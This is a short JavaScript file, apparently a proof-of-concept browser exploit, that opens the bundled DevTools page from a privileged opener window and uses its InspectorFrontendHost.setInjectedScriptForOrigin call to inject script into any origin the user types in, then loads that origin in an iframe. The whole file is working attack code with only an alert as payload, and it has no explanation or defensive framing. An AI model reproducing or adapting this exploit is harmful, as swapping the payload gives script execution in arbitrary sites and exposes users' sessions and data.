// alert(origin);

//     window.w = w;
// })
const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
window.opener.close();
w.addEventListener("load", async () => {
    if (!w.DevToolsAPI) {
        console.log("reloading");
        w.opener = null;
        w.location.reload();
    }
    await sleep(500);
    console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
    exploit(w);
});

window.w = w;


function exploit(w) {
    const URL_1 = w.prompt();
    w.InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, "alert(origin);//");
    const ifr = document.createElement("iframe");
    ifr.src = URL_1;
    w.document.body.appendChild(ifr);
    window.close();
}

function sleep(ms) {
    return new Promise(resolve => {
        setTimeout(resolve, ms);
    });
}